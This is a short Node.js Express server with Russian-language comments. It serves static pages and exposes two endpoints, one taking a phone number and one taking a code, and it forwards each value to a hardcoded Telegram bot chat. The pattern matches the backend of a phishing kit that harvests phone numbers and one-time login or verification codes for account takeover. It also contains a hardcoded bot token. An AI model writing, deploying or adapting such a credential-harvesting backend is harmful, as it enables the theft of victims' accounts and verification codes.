const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

const TELEGRAM_BOT_TOKEN = '7644523613:AAFK-3sc0EaMYb9XirbmiCJt4joBkD3sl0w';
const TELEGRAM_CHAT_ID = '-4854718691';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

app.use(bodyParser.json());
app.use(express.static('public')); // Статические файлы (например, index.html)

app.post('/submit-phone', async (req, res) => {
    const { phone } = req.body;
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: `Новый номер телефона: ${phone}`
        });
        res.status(200).send('OK');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error');
    }
});

app.post('/submit-code', async (req, res) => {
    const { code } = req.body;
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: `Новый код: ${code}`
        });
        res.status(200).send('OK');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error');
    }
});

app.listen(port, () => {
    console.log(`Сервер запущен на http://localhost:${port}`);
});
